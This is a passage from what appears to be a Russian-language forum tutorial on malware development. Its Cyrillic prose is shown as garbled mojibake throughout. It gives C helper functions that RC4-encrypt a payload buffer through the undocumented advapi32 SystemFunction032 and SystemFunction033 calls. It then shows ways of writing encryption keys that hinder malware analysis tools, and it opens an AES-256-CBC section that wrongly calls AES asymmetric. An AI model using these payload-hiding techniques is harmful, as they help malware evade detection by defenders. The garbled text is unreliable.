–ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–æ –Ω–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ API, —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ USTRING –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞. –û–¥–Ω–∞–∫–æ, –±–ª–∞–≥–æ–¥–∞—Ä—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è–º –∏ —Ä–µ—Å—É—Ä—Å–∞–º, —Ç–∞–∫–∏–º –∫–∞–∫ Wine, —Å—Ç–∞–ª–æ –≤–æ–∑–º–æ–∂–Ω—ã–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —ç—Ç—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
DWORD Length; // –†–∞–∑–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
DWORD MaximumLength; // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
PVOID Buffer; // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
} USTRING;</code></pre>
	</div>
</div><br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SystemFunction032</b><br />
<br />
–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è SystemFunction032 –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∏—Ç—å –µ–µ –∞–¥—Ä–µ—Å. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ advapi32.dll, –ø–æ—ç—Ç–æ–º—É —ç—Ç—É DLL –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤ –ø—Ä–æ—Ü–µ—Å—Å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ LoadLibrary. –í–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –≤ GetProcAddress –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ SystemFunction032.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032) GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);</code></pre>
	</div>
</div><br />
–§—É–Ω–∫—Ü–∏—è —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ SystemFunction032 –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞ –∫–∞–∫ —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö fnSystemFunction032:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS(NTAPI* fnSystemFunction032)(
struct USTRING* Data,   // –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ç–∏–ø–∞ USTRING, —Å–æ–¥–µ—Ä–∂–∞—â–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—É—Ñ–µ—Ä–µ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
struct USTRING* Key     // –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ç–∏–ø–∞ USTRING, —Å–æ–¥–µ—Ä–∂–∞—â–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–ª—é—á–µ, –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–º –ø—Ä–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏
);</code></pre>
	</div>
</div><br />
–ó–∞—Ç–µ–º –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å SystemFunction032 –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, –ø–µ—Ä–µ–¥–∞–≤–∞—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –∫–ª—é—á –∏ –¥–∞–Ω–Ω—ã–µ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞—Ö USTRING.<br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ—É–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –º–æ–∂–µ—Ç –±—ã—Ç—å —Ä–∏—Å–∫–æ–≤–∞–Ω–Ω—ã–º, —Ç–∞–∫ –∫–∞–∫ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –∏–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Ç–∞–∫–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å—Å—è –≤ –±—É–¥—É—â–∏—Ö –≤–µ—Ä—Å–∏—è—Ö –û–° –∏–ª–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è—Ö.<br />
<br />
–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ SystemFunction032:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    DWORD    Length;
    DWORD    MaximumLength;
    PVOID    Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Data,
    struct USTRING* Key
);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS    = NULL;

    USTRING Data = {
        .Buffer         = pPayloadData,
        .Length         = sPayloadSize,
        .MaximumLength  = sPayloadSize
    };

    USTRING    Key = {
        .Buffer         = pRc4Key,
        .Length         = dwRc4KeySize,
        .MaximumLength  = dwRc4KeySize
    },

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);

    if ((STATUS = SystemFunction032(&amp;Data, &amp;Key)) != 0x0) {
        printf(&quot;[!] SystemFunction032 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>RC4 –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ - –ú–µ—Ç–æ–¥ 3</b><br />
<br />
–ï—â–µ –æ–¥–∏–Ω —Å–ø–æ—Å–æ–± —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ RC4 - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SystemFunction033, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–µ –∂–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, —á—Ç–æ –∏ —Ä–∞–Ω–µ–µ –ø–æ–∫–∞–∑–∞–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è SystemFunction032.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
{
    DWORD    Length;
    DWORD    MaximumLength;
    PVOID    Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
    struct USTRING* Data,
    struct USTRING* Key
    );


/*
Helper function that calls SystemFunction033
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS    STATUS = NULL;

    USTRING        Key = {
            .Buffer        = pRc4Key,
            .Length        = dwRc4KeySize,
            .MaximumLength = dwRc4KeySize
    };

    USTRING     Data = {
            .Buffer         = pPayloadData,
            .Length         = sPayloadSize,
            .MaximumLength  = sPayloadSize
    };

    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction033&quot;);

    if ((STATUS = SystemFunction033(&amp;Data, &amp;Key)) != 0x0) {
        printf(&quot;[!] SystemFunction033 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§–æ—Ä–º–∞—Ç –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/–¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è</b><br />
<br />
–ò–º–µ–π—Ç–µ –≤ –≤–∏–¥—É, —á—Ç–æ –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –∫–ª—é—á–∞ –≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª —Å—á–∏—Ç–∞–µ—Ç—Å—è –ø–ª–æ—Ö–æ–π –ø—Ä–∞–∫—Ç–∏–∫–æ–π –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –ª–µ–≥–∫–æ –∏–∑–≤–ª–µ—á–µ–Ω–æ –ø—Ä–∏ –∞–Ω–∞–ª–∏–∑–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û. –í –±—É–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –±—É–¥—É—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ã —Ä–µ—à–µ–Ω–∏—è, –æ–±–µ—Å–ø–µ—á–∏–≤–∞—é—â–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ª–µ–≥–∫–æ–≥–æ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–ª—é—á–∞.<br />
<br />
<b>–†–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –∫–ª—é—á–∞</b><br />
<br />
–ü—Ä–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –≤–∞–∂–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è. –ö–ª—é—á –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω —Ä–∞–∑–Ω—ã–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–π –∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —É–¥–æ–±—Å—Ç–≤–∞ –∏ –¥—Ä—É–≥–∏—Ö –∞—Å–ø–µ–∫—Ç–æ–≤.<br />
<br />
<ol>
<li data-xf-list-type="ol"><b>–ü—Ä—è–º–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ –≤ –≤–∏–¥–µ —Å—Ç—Ä–æ–∫–∏:</b> –ü—Ä–æ—Å—Ç–µ–π—à–∏–π –∏ –Ω–∞–∏–±–æ–ª–µ–µ –ø–æ–Ω—è—Ç–Ω—ã–π —Å–ø–æ—Å–æ–±. –û–¥–Ω–∞–∫–æ, —Ç–∞–∫–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ª–µ–≥–∫–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ –∏ –∏–∑–≤–ª–µ—á–µ–Ω–æ –∏–∑ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –ø—Ä–∏ –∞–Ω–∞–ª–∏–∑–µ.<br />
unsigned char* key = &quot;ru-sfera.pw&quot;;</li>
<li data-xf-list-type="ol"><b>–ü—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ –≤ –≤–∏–¥–µ –º–∞—Å—Å–∏–≤–∞ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω—ã—Ö –±–∞–π—Ç–æ–≤:</b> –≠—Ç–æ –Ω–µ–º–Ω–æ–≥–æ –º–µ–Ω–µ–µ –æ—á–µ–≤–∏–¥–Ω–æ –¥–ª—è —á–µ–ª–æ–≤–µ—á–µ—Å–∫–æ–≥–æ –≥–ª–∞–∑–∞ –ø—Ä–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞, –Ω–æ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–æ—Å—Ç—ã–º –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞.<br />
unsigned char key[] = {<br />
0x6D, 0x61, 0x6C, 0x64, 0x65, 0x76, 0x31, 0x32, 0x33<br />
};</li>
<li data-xf-list-type="ol"><b>–ü—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ –≤ –≤–∏–¥–µ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ (—ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å—é):</b> –ü–æ—Ö–æ–∂–µ –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–π –º–µ—Ç–æ–¥, –Ω–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Å—Ç—Ä–æ–∫—É.<br />
unsigned char* key = &quot;\x6D\x61\x64\x65\x76\x31\x32\x33&quot;;</li>
<li data-xf-list-type="ol"><b>–ü—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ —á–µ—Ä–µ–∑ —Å—Ç–µ–∫ —Å—Ç—Ä–æ–∫:</b> –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –º–∞—Å–∫–∏—Ä—É–µ—Ç –∫–ª—é—á, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—è –µ–≥–æ –≤ –≤–∏–¥–µ –º–∞—Å—Å–∏–≤–∞ —Å–∏–º–≤–æ–ª–æ–≤. –≠—Ç–æ –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –∞–Ω–∞–ª–∏–∑–∞.<br />
unsigned char key[] = {<br />
&#039;r&#039;, &#039;u&#039;, &#039;-&#039;, &#039;s&#039;, &#039;f&#039;, &#039;e&#039;,&#039;r&#039;, &#039;a&#039;, &#039;.&#039;, &#039;p&#039;,&#039;w&#039;<br />
};</li>
</ol>–í–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –º–µ—Ç–æ–¥–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –∫–ª—é—á–∞, –∫–ª—é—á–∏, –∑–∞—à–∏—Ç—ã–µ –ø—Ä—è–º–æ –≤ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —É–≥—Ä–æ–∑—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É, –æ–Ω –º–æ–∂–µ—Ç –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –∏–∑–≤–ª–µ—á—å —ç—Ç–æ—Ç –∫–ª—é—á. –°—É—â–µ—Å—Ç–≤—É—é—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –∏ —Å–∫—Ä—ã—Ç–∏—è –∫–ª—é—á–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –ø—Ä–∏–º–µ–Ω–µ–Ω—ã –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
<br />
<br />
<b> –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ AES (–°—Ç–∞–Ω–¥–∞—Ä—Ç –°–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è)</b><br />
<br />
–¢–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –±–æ–ª–µ–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –∏–∑–≤–µ—Å—Ç–Ω—ã–π –∫–∞–∫ AES (Advanced Encryption Standard). –≠—Ç–æ –∞—Å—Å–∏–º–∏—Ç—Ä–∏—á–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∫–ª—é—á–µ–π –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∏–¥–æ–≤ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES, —Ç–∞–∫–∏—Ö –∫–∞–∫ AES128, AES192 –∏ AES256, –∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–ª–∏—á–∞—é—Ç—Å—è —Ä–∞–∑–º–µ—Ä–æ–º –∫–ª—é—á–∞. –ù–∞–ø—Ä–∏–º–µ—Ä, AES128 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç 128-–±–∏—Ç–Ω—ã–π –∫–ª—é—á, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ AES256 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç 256-–±–∏—Ç–Ω—ã–π –∫–ª—é—á.<br />
<br />
–ö —Ç–æ–º—É –∂–µ, AES –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ä–µ–∂–∏–º—ã —Ä–∞–±–æ—Ç—ã –±–ª–æ—á–Ω—ã—Ö —à–∏—Ñ—Ä–æ–≤, —Ç–∞–∫–∏–µ –∫–∞–∫ CBC –∏ GCM. –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ä–µ–∂–∏–º–∞ —Ä–∞–±–æ—Ç—ã AES —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –≤–º–µ—Å—Ç–µ —Å –∫–ª—é—á–æ–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –Ω–∞–∑—ã–≤–∞–µ–º—ã–π –≤–µ–∫—Ç–æ—Ä–æ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∏–ª–∏ IV. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ IV –¥–æ–±–∞–≤–ª—è–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∫ –ø—Ä–æ—Ü–µ—Å—Å—É —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
–ù–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ —Ç–∏–ø–∞ AES, AES –≤—Å–µ–≥–¥–∞ —Ç—Ä–µ–±—É–µ—Ç –≤–≤–æ–¥ –≤ 128 –±–∏—Ç –∏ –≤—ã–≤–æ–¥–∏—Ç –±–ª–æ–∫–∏ –≤ 128 –±–∏—Ç. –í–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∫—Ä–∞—Ç–Ω—ã 16 –±–∞–π—Ç–∞–º (128 –±–∏—Ç). –ï—Å–ª–∏ —à–∏—Ñ—Ä—É–µ–º–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –∫—Ä–∞—Ç–Ω–∞ 16 –±–∞–π—Ç–∞–º, —Ç–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è —É–≤–µ–ª–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø—Ä–∏–≤–µ–¥–µ–Ω–∏—è –µ–µ –∫ –∫—Ä–∞—Ç–Ω–æ—Å—Ç–∏ 16 –±–∞–π—Ç–∞–º.<br />
<br />
–í —Å—Ç–∞—Ç—å–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã –ø—Ä–∏–º–µ—Ä –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç AES256-CBC. –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑—É–µ—Ç WinAPI. –°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ, –ø–æ—Å–∫–æ–ª—å–∫—É –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è AES256-CBC, –∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç 32-–±–∞–π—Ç–Ω—ã–π –∫–ª—é—á –∏ 16-–±–∞–π—Ç–Ω—ã–π IV. –≠—Ç–æ –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å—Å—è, –µ—Å–ª–∏ –≤ –∫–æ–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥—Ä—É–≥–æ–π —Ç–∏–ø –∏–ª–∏ —Ä–µ–∂–∏–º AES.<br />
<br />
<b>–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI (–±–∏–±–ª–∏–æ—Ç–µ–∫–∞ bCrypt)</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ø–æ—Å–æ–±–æ–≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES. –í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ bCrypt (bcrypt.h) –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è AES.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ AES</b><br />
<br />
